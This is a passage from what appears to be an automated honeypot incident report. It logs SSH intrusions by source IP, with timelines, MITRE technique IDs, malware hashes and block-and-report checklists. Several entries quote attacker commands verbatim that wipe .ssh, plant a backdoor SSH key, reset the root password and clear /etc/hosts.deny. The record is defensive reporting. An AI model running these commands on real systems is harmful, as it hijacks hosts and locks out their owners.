| `2026-06-12 18:26:24` | `cowrie.log.closed` |
| `2026-06-12 18:26:24` | `cowrie.session.params` |
| `2026-06-12 18:26:24` | `cowrie.command.input` |
| `2026-06-12 18:26:24` | `cowrie.log.closed` |
| `2026-06-12 18:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.33.242[.]180` to AbuseIPDB if not already reported
- [ ] Block `117.33.242[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289190db0b0b

| Field | Detail |
|---|---|
| **Source IP** | `103.186.31[.]66` |
| **First Seen** | 2026-06-12 18:26 |
| **Last Seen** | 2026-06-12 18:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:26:10` | `cowrie.session.connect` |
| `2026-06-12 18:26:10` | `cowrie.client.version` |
| `2026-06-12 18:26:10` | `cowrie.client.kex` |
| `2026-06-12 18:26:11` | `cowrie.login.success` |
| `2026-06-12 18:26:11` | `cowrie.session.params` |
| `2026-06-12 18:26:11` | `cowrie.command.input` |
| `2026-06-12 18:26:11` | `cowrie.command.failed` |
| `2026-06-12 18:26:11` | `cowrie.log.closed` |
| `2026-06-12 18:26:11` | `cowrie.session.params` |
| `2026-06-12 18:26:11` | `cowrie.command.input` |
| `2026-06-12 18:26:11` | `cowrie.session.file_download` |
| `2026-06-12 18:26:11` | `cowrie.log.closed` |
| `2026-06-12 18:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.31[.]66` to AbuseIPDB if not already reported
- [ ] Block `103.186.31[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5071c2dd809f

| Field | Detail |
|---|---|
| **Source IP** | `103.186.31[.]66` |
| **First Seen** | 2026-06-12 18:26 |
| **Last Seen** | 2026-06-12 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:26:13` | `cowrie.session.connect` |
| `2026-06-12 18:26:13` | `cowrie.client.version` |
| `2026-06-12 18:26:13` | `cowrie.client.kex` |
| `2026-06-12 18:26:13` | `cowrie.login.success` |
| `2026-06-12 18:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.31[.]66` to AbuseIPDB if not already reported
- [ ] Block `103.186.31[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ead32439108d

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-06-12 18:41 |
| **Last Seen** | 2026-06-12 18:41 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2RMUG8hwPe7q"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:41:06` | `cowrie.session.connect` |
| `2026-06-12 18:41:06` | `cowrie.client.version` |
| `2026-06-12 18:41:06` | `cowrie.client.kex` |
| `2026-06-12 18:41:07` | `cowrie.login.success` |
| `2026-06-12 18:41:07` | `cowrie.session.params` |
| `2026-06-12 18:41:07` | `cowrie.command.input` |
| `2026-06-12 18:41:07` | `cowrie.command.failed` |
| `2026-06-12 18:41:07` | `cowrie.log.closed` |
| `2026-06-12 18:41:08` | `cowrie.session.params` |
| `2026-06-12 18:41:08` | `cowrie.command.input` |
| `2026-06-12 18:41:08` | `cowrie.session.file_download` |
| `2026-06-12 18:41:08` | `cowrie.log.closed` |
| `2026-06-12 18:41:20` | `cowrie.session.params` |
| `2026-06-12 18:41:20` | `cowrie.command.input` |
| `2026-06-12 18:41:20` | `cowrie.log.closed` |
| `2026-06-12 18:41:20` | `cowrie.session.params` |
| `2026-06-12 18:41:20` | `cowrie.command.input` |
| `2026-06-12 18:41:20` | `cowrie.log.closed` |
| `2026-06-12 18:41:21` | `cowrie.session.params` |
| `2026-06-12 18:41:21` | `cowrie.command.input` |
| `2026-06-12 18:41:21` | `cowrie.session.file_download` |
| `2026-06-12 18:41:21` | `cowrie.log.closed` |
| `2026-06-12 18:41:21` | `cowrie.session.params` |
| `2026-06-12 18:41:21` | `cowrie.command.input` |
| `2026-06-12 18:41:21` | `cowrie.log.closed` |
| `2026-06-12 18:41:22` | `cowrie.session.params` |
| `2026-06-12 18:41:22` | `cowrie.command.input` |
| `2026-06-12 18:41:22` | `cowrie.log.closed` |
| `2026-06-12 18:41:22` | `cowrie.session.params` |
| `2026-06-12 18:41:22` | `cowrie.command.input` |
| `2026-06-12 18:41:22` | `cowrie.command.input` |
| `2026-06-12 18:41:23` | `cowrie.log.closed` |
| `2026-06-12 18:41:23` | `cowrie.session.params` |
| `2026-06-12 18:41:23` | `cowrie.command.input` |
| `2026-06-12 18:41:23` | `cowrie.log.closed` |
| `2026-06-12 18:41:23` | `cowrie.session.params` |
| `2026-06-12 18:41:23` | `cowrie.command.input` |
| `2026-06-12 18:41:24` | `cowrie.log.closed` |
| `2026-06-12 18:41:24` | `cowrie.session.params` |
| `2026-06-12 18:41:24` | `cowrie.command.input` |
| `2026-06-12 18:41:24` | `cowrie.log.closed` |
| `2026-06-12 18:41:24` | `cowrie.session.params` |
| `2026-06-12 18:41:24` | `cowrie.command.input` |
| `2026-06-12 18:41:25` | `cowrie.log.closed` |
| `2026-06-12 18:41:25` | `cowrie.session.params` |
| `2026-06-12 18:41:25` | `cowrie.command.input` |
| `2026-06-12 18:41:25` | `cowrie.log.closed` |
| `2026-06-12 18:41:25` | `cowrie.session.params` |
| `2026-06-12 18:41:25` | `cowrie.command.input` |
| `2026-06-12 18:41:25` | `cowrie.log.closed` |
| `2026-06-12 18:41:26` | `cowrie.session.params` |
| `2026-06-12 18:41:26` | `cowrie.command.input` |
| `2026-06-12 18:41:26` | `cowrie.log.closed` |
| `2026-06-12 18:41:26` | `cowrie.session.params` |
| `2026-06-12 18:41:26` | `cowrie.command.input` |
| `2026-06-12 18:41:26` | `cowrie.log.closed` |
| `2026-06-12 18:41:27` | `cowrie.session.params` |
| `2026-06-12 18:41:27` | `cowrie.command.input` |
| `2026-06-12 18:41:27` | `cowrie.log.closed` |
| `2026-06-12 18:41:27` | `cowrie.session.params` |
| `2026-06-12 18:41:27` | `cowrie.command.input` |
| `2026-06-12 18:41:27` | `cowrie.log.closed` |
| `2026-06-12 18:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50ef0a6f201b

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-06-12 18:46 |
| **Last Seen** | 2026-06-12 18:46 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Kc7U0MQ8rA6T"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:46:03` | `cowrie.session.connect` |
| `2026-06-12 18:46:03` | `cowrie.client.version` |
| `2026-06-12 18:46:04` | `cowrie.client.kex` |
| `2026-06-12 18:46:04` | `cowrie.login.success` |
| `2026-06-12 18:46:05` | `cowrie.session.params` |
| `2026-06-12 18:46:05` | `cowrie.command.input` |
| `2026-06-12 18:46:05` | `cowrie.command.failed` |
| `2026-06-12 18:46:05` | `cowrie.log.closed` |
| `2026-06-12 18:46:05` | `cowrie.session.params` |
| `2026-06-12 18:46:05` | `cowrie.command.input` |
| `2026-06-12 18:46:05` | `cowrie.session.file_download` |
| `2026-06-12 18:46:05` | `cowrie.log.closed` |
| `2026-06-12 18:46:17` | `cowrie.session.params` |
| `2026-06-12 18:46:17` | `cowrie.command.input` |
| `2026-06-12 18:46:18` | `cowrie.log.closed` |
| `2026-06-12 18:46:18` | `cowrie.session.params` |
| `2026-06-12 18:46:18` | `cowrie.command.input` |
| `2026-06-12 18:46:18` | `cowrie.log.closed` |
| `2026-06-12 18:46:18` | `cowrie.session.params` |
| `2026-06-12 18:46:18` | `cowrie.command.input` |
| `2026-06-12 18:46:18` | `cowrie.session.file_download` |
| `2026-06-12 18:46:18` | `cowrie.log.closed` |
| `2026-06-12 18:46:19` | `cowrie.session.params` |
| `2026-06-12 18:46:19` | `cowrie.command.input` |
| `2026-06-12 18:46:19` | `cowrie.log.closed` |
| `2026-06-12 18:46:19` | `cowrie.session.params` |
| `2026-06-12 18:46:19` | `cowrie.command.input` |
| `2026-06-12 18:46:19` | `cowrie.log.closed` |
| `2026-06-12 18:46:20` | `cowrie.session.params` |
| `2026-06-12 18:46:20` | `cowrie.command.input` |
| `2026-06-12 18:46:20` | `cowrie.command.input` |
| `2026-06-12 18:46:20` | `cowrie.log.closed` |
| `2026-06-12 18:46:20` | `cowrie.session.params` |
| `2026-06-12 18:46:20` | `cowrie.command.input` |
| `2026-06-12 18:46:20` | `cowrie.log.closed` |
| `2026-06-12 18:46:21` | `cowrie.session.params` |
| `2026-06-12 18:46:21` | `cowrie.command.input` |
| `2026-06-12 18:46:21` | `cowrie.log.closed` |
| `2026-06-12 18:46:21` | `cowrie.session.params` |
| `2026-06-12 18:46:21` | `cowrie.command.input` |
| `2026-06-12 18:46:21` | `cowrie.log.closed` |
| `2026-06-12 18:46:22` | `cowrie.session.params` |
| `2026-06-12 18:46:22` | `cowrie.command.input` |
| `2026-06-12 18:46:22` | `cowrie.log.closed` |
| `2026-06-12 18:46:22` | `cowrie.session.params` |
| `2026-06-12 18:46:22` | `cowrie.command.input` |
| `2026-06-12 18:46:22` | `cowrie.log.closed` |
| `2026-06-12 18:46:23` | `cowrie.session.params` |
| `2026-06-12 18:46:23` | `cowrie.command.input` |
| `2026-06-12 18:46:23` | `cowrie.log.closed` |
| `2026-06-12 18:46:23` | `cowrie.session.params` |
| `2026-06-12 18:46:23` | `cowrie.command.input` |
| `2026-06-12 18:46:23` | `cowrie.log.closed` |
| `2026-06-12 18:46:24` | `cowrie.session.params` |
| `2026-06-12 18:46:24` | `cowrie.command.input` |
| `2026-06-12 18:46:24` | `cowrie.log.closed` |
| `2026-06-12 18:46:24` | `cowrie.session.params` |
| `2026-06-12 18:46:24` | `cowrie.command.input` |
| `2026-06-12 18:46:24` | `cowrie.log.closed` |
| `2026-06-12 18:46:24` | `cowrie.session.params` |
| `2026-06-12 18:46:24` | `cowrie.command.input` |
| `2026-06-12 18:46:25` | `cowrie.log.closed` |
| `2026-06-12 18:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd3bc679187

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 18:46 |
| **Last Seen** | 2026-06-12 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:46:22` | `cowrie.session.connect` |
| `2026-06-12 18:46:22` | `cowrie.client.version` |
| `2026-06-12 18:46:22` | `cowrie.client.kex` |
| `2026-06-12 18:46:23` | `cowrie.login.success` |
| `2026-06-12 18:46:23` | `cowrie.session.params` |
| `2026-06-12 18:46:23` | `cowrie.command.input` |
| `2026-06-12 18:46:23` | `cowrie.command.failed` |
| `2026-06-12 18:46:24` | `cowrie.log.closed` |
| `2026-06-12 18:46:24` | `cowrie.session.params` |
| `2026-06-12 18:46:24` | `cowrie.command.input` |
| `2026-06-12 18:46:24` | `cowrie.session.file_download` |
| `2026-06-12 18:46:24` | `cowrie.log.closed` |
| `2026-06-12 18:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4720b0dc5da4

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 18:46 |
| **Last Seen** | 2026-06-12 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:46:27` | `cowrie.session.connect` |
| `2026-06-12 18:46:27` | `cowrie.client.version` |
| `2026-06-12 18:46:27` | `cowrie.client.kex` |
| `2026-06-12 18:46:30` | `cowrie.login.success` |
| `2026-06-12 18:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088becf70632

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-06-12 18:46 |
| **Last Seen** | 2026-06-12 18:47 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8SmZlkcmb7yy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:46:55` | `cowrie.session.connect` |
| `2026-06-12 18:46:56` | `cowrie.client.version` |
| `2026-06-12 18:46:56` | `cowrie.client.kex` |
| `2026-06-12 18:46:57` | `cowrie.login.success` |
| `2026-06-12 18:46:57` | `cowrie.session.params` |
| `2026-06-12 18:46:57` | `cowrie.command.input` |
| `2026-06-12 18:46:57` | `cowrie.command.failed` |
| `2026-06-12 18:46:57` | `cowrie.log.closed` |
| `2026-06-12 18:46:58` | `cowrie.session.params` |
| `2026-06-12 18:46:58` | `cowrie.command.input` |
| `2026-06-12 18:46:58` | `cowrie.session.file_download` |
| `2026-06-12 18:46:58` | `cowrie.log.closed` |
| `2026-06-12 18:47:10` | `cowrie.session.params` |
| `2026-06-12 18:47:10` | `cowrie.command.input` |
| `2026-06-12 18:47:10` | `cowrie.log.closed` |
| `2026-06-12 18:47:10` | `cowrie.session.params` |
| `2026-06-12 18:47:10` | `cowrie.command.input` |
| `2026-06-12 18:47:11` | `cowrie.log.closed` |
| `2026-06-12 18:47:11` | `cowrie.session.params` |
| `2026-06-12 18:47:11` | `cowrie.command.input` |
| `2026-06-12 18:47:11` | `cowrie.session.file_download` |
| `2026-06-12 18:47:11` | `cowrie.log.closed` |
| `2026-06-12 18:47:11` | `cowrie.session.params` |
| `2026-06-12 18:47:11` | `cowrie.command.input` |
| `2026-06-12 18:47:12` | `cowrie.log.closed` |
| `2026-06-12 18:47:12` | `cowrie.session.params` |
| `2026-06-12 18:47:12` | `cowrie.command.input` |
| `2026-06-12 18:47:12` | `cowrie.log.closed` |
| `2026-06-12 18:47:12` | `cowrie.session.params` |
| `2026-06-12 18:47:12` | `cowrie.command.input` |
| `2026-06-12 18:47:12` | `cowrie.command.input` |
| `2026-06-12 18:47:13` | `cowrie.log.closed` |
| `2026-06-12 18:47:13` | `cowrie.session.params` |
| `2026-06-12 18:47:13` | `cowrie.command.input` |
| `2026-06-12 18:47:13` | `cowrie.log.closed` |
| `2026-06-12 18:47:13` | `cowrie.session.params` |
| `2026-06-12 18:47:13` | `cowrie.command.input` |
| `2026-06-12 18:47:14` | `cowrie.log.closed` |
| `2026-06-12 18:47:14` | `cowrie.session.params` |
| `2026-06-12 18:47:14` | `cowrie.command.input` |
| `2026-06-12 18:47:14` | `cowrie.log.closed` |
| `2026-06-12 18:47:14` | `cowrie.session.params` |
| `2026-06-12 18:47:14` | `cowrie.command.input` |
| `2026-06-12 18:47:15` | `cowrie.log.closed` |
| `2026-06-12 18:47:15` | `cowrie.session.params` |
| `2026-06-12 18:47:15` | `cowrie.command.input` |
| `2026-06-12 18:47:15` | `cowrie.log.closed` |
| `2026-06-12 18:47:15` | `cowrie.session.params` |
| `2026-06-12 18:47:15` | `cowrie.command.input` |
| `2026-06-12 18:47:16` | `cowrie.log.closed` |
| `2026-06-12 18:47:16` | `cowrie.session.params` |
| `2026-06-12 18:47:16` | `cowrie.command.input` |
| `2026-06-12 18:47:16` | `cowrie.log.closed` |
| `2026-06-12 18:47:16` | `cowrie.session.params` |
| `2026-06-12 18:47:16` | `cowrie.command.input` |
| `2026-06-12 18:47:16` | `cowrie.log.closed` |
| `2026-06-12 18:47:17` | `cowrie.session.params` |
| `2026-06-12 18:47:17` | `cowrie.command.input` |
| `2026-06-12 18:47:17` | `cowrie.log.closed` |
| `2026-06-12 18:47:17` | `cowrie.session.params` |
| `2026-06-12 18:47:17` | `cowrie.command.input` |
| `2026-06-12 18:47:17` | `cowrie.log.closed` |
| `2026-06-12 18:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efb78e51003

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:49 |
| **Last Seen** | 2026-06-12 18:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:49:54` | `cowrie.session.connect` |
| `2026-06-12 18:49:54` | `cowrie.client.version` |
| `2026-06-12 18:49:54` | `cowrie.client.kex` |
| `2026-06-12 18:49:55` | `cowrie.login.success` |
| `2026-06-12 18:49:55` | `cowrie.session.params` |
| `2026-06-12 18:49:55` | `cowrie.command.input` |
| `2026-06-12 18:49:55` | `cowrie.command.failed` |
| `2026-06-12 18:49:55` | `cowrie.log.closed` |
| `2026-06-12 18:49:55` | `cowrie.session.params` |
| `2026-06-12 18:49:55` | `cowrie.command.input` |
| `2026-06-12 18:49:55` | `cowrie.session.file_download` |
| `2026-06-12 18:49:55` | `cowrie.log.closed` |
| `2026-06-12 18:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f15ecda4800a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:49 |
| **Last Seen** | 2026-06-12 18:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:49:57` | `cowrie.session.connect` |
| `2026-06-12 18:49:57` | `cowrie.client.version` |
| `2026-06-12 18:49:57` | `cowrie.client.kex` |
| `2026-06-12 18:49:58` | `cowrie.login.success` |
| `2026-06-12 18:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b5e917d432

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:50 |
| **Last Seen** | 2026-06-12 18:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
